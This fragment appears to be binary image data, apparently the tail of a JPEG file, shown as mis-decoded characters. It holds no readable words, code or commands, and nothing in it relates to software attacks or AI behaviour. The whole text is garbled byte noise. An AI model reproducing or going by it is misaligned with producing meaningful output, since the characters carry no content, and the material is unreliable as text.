â_„³Ú\üp×´?Mâ(á:ñV·à™µ_ëÚ=ü5û;wû~|WðåÕÏ‡¼Wÿ îýª¥ñFƒq6âI|â?ƒ~(ðtºþ—#XëxOÄ×>5Ð.<Eá§Ô`¸m]ŸBÑfÕô³k¨K¤éÏpÖpþ?~ØpÃ©|Jÿ ‚–|HÔbŽÿ â'ìóâïÙ¾/€>=½n¼ið6/øª)|IÁïÎ$×>Çân.$×ÁwÚ"êÒO3ß‹†•ËN?ííî>øyà†yçðw†fši¢I%šY4K’Ydug’I‹»¹,ÌK1$“@ÿÙ